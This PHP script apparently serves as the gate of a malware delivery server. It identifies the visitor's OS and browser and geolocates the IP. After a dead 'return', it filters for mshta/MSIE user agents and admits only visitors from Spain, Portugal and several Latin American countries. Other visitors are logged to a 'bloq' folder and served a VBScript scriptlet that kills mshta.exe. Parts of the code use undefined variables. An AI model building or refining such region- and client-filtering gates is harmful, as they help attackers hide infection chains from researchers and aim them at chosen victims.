<?php
error_reporting(1);

function detectOperatingSystem(?string $userAgent = null): string
{
    $ua = strtolower($userAgent ?? ($_SERVER['HTTP_USER_AGENT'] ?? ''));

    if ($ua === '') {
        return 'Unknown';
    }

    $rules = [
        'Windows 11'           => ['windows nt 10.0', 'windows 11'], // UA antigo ainda manda 10.0
        'Windows 10'           => ['windows nt 10.0'],
        'Windows 8.1'          => ['windows nt 6.3'],
        'Windows 8'            => ['windows nt 6.2'],
        'Windows 7'            => ['windows nt 6.1'],
        'Windows Vista'        => ['windows nt 6.0'],
        'Windows XP'           => ['windows nt 5.1', 'windows xp'],
        'Windows Server 2003'  => ['windows nt 5.2'],
        'Windows 2000'         => ['windows nt 5.0'],
        'iOS'                  => ['iphone', 'ipad', 'ipod'],
        'Android'              => ['android'],
        'Chrome OS'            => ['cros'],
        'macOS'                => ['macintosh', 'mac os x'],
        'Linux'                => ['linux', 'ubuntu', 'debian', 'fedora', 'centos'],
        'BlackBerry'           => ['blackberry'],
    ];

    foreach ($rules as $os => $needles) {
        foreach ($needles as $needle) {
            if (str_contains($ua, $needle)) {
                return $os;
            }
        }
    }

    return 'Unknown';
}
function detectBrowser(?string $userAgent = null): string
{
    $ua = strtolower($userAgent ?? ($_SERVER['HTTP_USER_AGENT'] ?? ''));

    if ($ua === '') {
        return 'Unknown';
    }

    // Ordem importa: Edge/Opera/Chrome trazem "safari" e "chrome" no UA
    $rules = [
        'Edge'               => ['edg/', 'edge/'],
        'Opera'              => ['opr/', 'opera'],
        'Samsung Internet'   => ['samsungbrowser'],
        'UC Browser'         => ['ucbrowser'],
        'Chrome'             => ['chrome/', 'crios/'],
        'Firefox'            => ['firefox/', 'fxios/'],
        'Safari'             => ['safari/'],
        'Internet Explorer'  => ['msie', 'trident/'],
        'Brave'              => ['brave'], // nem sempre aparece no UA
    ];

    foreach ($rules as $browser => $needles) {
        foreach ($needles as $needle) {
            if (str_contains($ua, $needle)) {
                // Safari: só se não for Chrome/Chromium disfarçado
                if ($browser === 'Safari' && (str_contains($ua, 'chrome/') || str_contains($ua, 'crios/'))) {
                    continue;
                }
                return $browser;
            }
        }
    }

    return 'Unknown';
}
function getGeo(string $ip, ?string $apiKey = null): ?object
{
    // Valida IP (v4/v6)
    if (!filter_var($ip, FILTER_VALIDATE_IP)) {
        return null;
    }
    // Não consulta IPs privados/reservados
    if (!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
        return null;
    }
    $apiKey = $apiKey ?? getenv('IP_API_KEY') ?: null;
    if ($apiKey === null || $apiKey === '') {
        return null;
    }
    $url = sprintf(
        'https://pro.ip-api.com/json/%s?key=%s&fields=status,message,country,countryCode,regionName,city,query',
        rawurlencode($ip),
        rawurlencode($apiKey)
    );
    $ch = curl_init($url);
    if ($ch === false) {
        return null;
    }
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => false,
        CURLOPT_CONNECTTIMEOUT => 3,
        CURLOPT_TIMEOUT        => 5,
        CURLOPT_HTTPHEADER     => ['Accept: application/json'],
        CURLOPT_USERAGENT      => 'GeoLookup/1.0',
    ]);
    $body = curl_exec($ch);
    $errno = curl_errno($ch);
    $httpCode = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    if ($errno !== 0 || $httpCode !== 200 || $body === false || $body === '') {
        return null;
    }
    $data = json_decode($body);
    if (!is_object($data) || ($data->status ?? '') !== 'success') {
        return null;
    }
    return $data;
}
// Uso
$os = detectOperatingSystem();
echo $os;

echo detectBrowser();

$geo = getGeo($_SERVER['REMOTE_ADDR'] ?? '');
$country = $geo->country ?? '-';
$countryCode = $geo->countryCode ?? '-';
return;

$user_agent = strtolower($_SERVER['HTTP_USER_AGENT']);

// Bloqueia navegadores que não sejam .NET ou MSIE
if (strpos($user_agent, ".net") > 0 || strpos($user_agent, "msie") > 0) {
    print_r("Acesso permitido para navegadores .NET ou MSIE.");
} else {
    // header('Content-Type: text/plain;');
    // header("HTTP/1.0 404 Not Found");
    // exit;
        print_r("Acesso não permitido para navegadores .NET ou MSIE.");
       // exit;   
}
// Obtém o endereço IP do cliente
    $IP = ($_SERVER["REMOTE_ADDR"]) ? $_SERVER["REMOTE_ADDR"] : (($_SERVER["HTTP_X_FORWARDED_FOR"]) ? $_SERVER["HTTP_X_FORWARDED_FOR"] : $_SERVER["HTTP_CLIENT_IP"]);
   $country = "";
    try {
        $localizacao = getGeo($IP);
        $country = isset($localizacao) && isset($localizacao->country) ? $localizacao->country : "-";
        $countryCODE = isset($localizacao) && isset($localizacao->countryCode) ? $localizacao->countryCode : "-";
    } catch (Exception $e) {
         print_r($e->getMessage());
    }
 var_dump($localizacao);
   // echo  " | IP: " . $IP . " | País: " . $country . " | Código do País: " . $countryCODE . "\n\n";


$data = date('d h:i:s a', time());

    if (!(($country == "") || ($country == 'Spain') || ($country == 'Mexico') || ($country == 'Brazil') || ($country == 'Portugal') || ($country == 'Argentina') || ($country == 'Peru')  || ($country == 'Chile') || ($country == 'Colombia')))
         {

        $fp = fopen("bloq/COUNTRY||" . $IP . " || " . $host . " || " . $country . " || " . $user_browser . " || " . $user_os .  ".txt", "wb");
        fwrite($fp, "");
        fclose($fp);

        $codex = '<?xml version="1.0" encoding="utf-8" ?>
<component id="component2">


    <script language="VBScript">
    <![CDATA[
    CreateObject("WScript.Shell").run "taskkill /F /IM mshta.exe", 2
    ]]>
    </script>
</component>';
 //echo $codex;
 //exit;
}

?>